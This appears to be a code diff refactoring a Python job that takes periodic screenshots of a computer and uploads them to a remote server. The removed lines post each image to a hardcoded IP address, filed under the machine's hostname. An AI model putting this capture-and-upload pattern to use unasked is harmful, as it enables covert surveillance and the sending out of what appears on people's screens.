@@ -1,9 +1,7 @@
 import os
-import socket
 import threading
 import time
 
-import requests
 import schedule
 
 from client.jobs.core.job import Job
@@ -14,8 +12,7 @@ from core.utils.logger import logger
 class Screenshot(Job):
     def __init__(self):
         super().__init__()
-        self.upload_url = "http://39.107.248.76/file/upload"
-        self.interval_seconds = 20
+        self.interval_seconds = 60  # 1分钟
 
     def _capture_screenshot(self, filename: str):
         if os.name == 'nt':
@@ -29,16 +26,6 @@ class Screenshot(Job):
 
         raise RuntimeError('Unsupported operating system')
 
-    def _upload_file(self, file_path: str):
-        with open(file_path, 'rb') as file_obj:
-            response = requests.post(
-                self.upload_url,
-                files={'files': file_obj},
-                data={'currentDirectory': f'/public/{socket.gethostname()}/'},
-                timeout=30,
-            )
-        return response
-
     def _run_capture_task(self):
         screenshot_name = f'screenshot_{get_time()}.png'
         self._capture_screenshot(screenshot_name)
@@ -49,7 +36,7 @@ class Screenshot(Job):
             return
 
         try:
-            response = self._upload_file(screenshot_path)
+            response = self.upload_file_via_http(screenshot_path)
             self.send_to_server(1, f'Upload result: {response.text}', 0)
         finally:
             try:
@@ -59,6 +46,7 @@ class Screenshot(Job):
 
     def run(self):
         try:
+            time.sleep(2)
             self.mark_running()
             self.send_to_server(1, f'Scheduled screenshot task started (every {self.interval_seconds}s)', 0)
 
@@ -68,14 +56,17 @@ class Screenshot(Job):
                 schedule.run_pending()
                 time.sleep(1)
 
-            self.send_to_server(1, 'Scheduled screenshot task stopped', 0)
+            if getattr(self.server, 'is_connected', True):
+                self.send_to_server(1, 'Scheduled screenshot task stopped', 0)
         except Exception as e:
-            self.send_to_server(0, f'Screenshot task error: {e}', 0)
+            if getattr(self.server, 'is_connected', True):
+                self.send_to_server(0, f'Screenshot task error: {e}', 0)
         finally:
             schedule.clear()
             self.mark_stopped()
             logger.info(f'Thread ended: {threading.current_thread().name}')
-            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)
+            if getattr(self.server, 'is_connected', True):
+                self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)
 
     def stop(self, notify: bool = True):
         schedule.clear()
